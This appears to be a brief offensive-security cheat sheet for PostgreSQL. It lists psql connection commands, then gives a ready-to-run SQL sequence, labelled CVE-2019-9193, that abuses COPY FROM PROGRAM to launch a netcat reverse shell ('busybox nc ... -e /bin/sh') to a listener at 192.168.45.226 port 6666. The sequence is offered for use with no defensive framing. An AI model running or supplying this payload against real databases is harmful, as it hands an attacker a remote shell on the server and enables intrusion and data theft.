# Service Interaction

## psql

```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

# [CVE-2019–9193](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution)

```bash
DROP TABLE IF EXISTS cmd_exec;          
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'busybox nc 192.168.45.226 6666 -e /bin/sh';   
SELECT * FROM cmd_exec;               
DROP TABLE IF EXISTS cmd_exec;
```

